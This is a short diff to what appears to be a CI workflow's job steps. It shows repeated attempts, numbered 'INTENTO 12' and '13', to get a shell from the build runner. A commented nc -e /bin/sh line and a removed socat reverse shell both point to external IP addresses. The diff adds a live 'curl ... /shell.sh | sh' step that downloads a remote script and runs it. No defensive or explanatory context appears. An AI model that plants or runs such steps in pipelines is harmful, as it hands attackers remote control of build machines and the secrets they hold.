@@ -55,8 +55,9 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 12 186.189.75.20
-          socat TCP:186.189.75.20:4444 EXEC:/bin/bash  
+          # INTENTO 13 186.189.75.20
+          curl http://186.189.75.20:8000/shell.sh | sh 
+ 
           
 
 
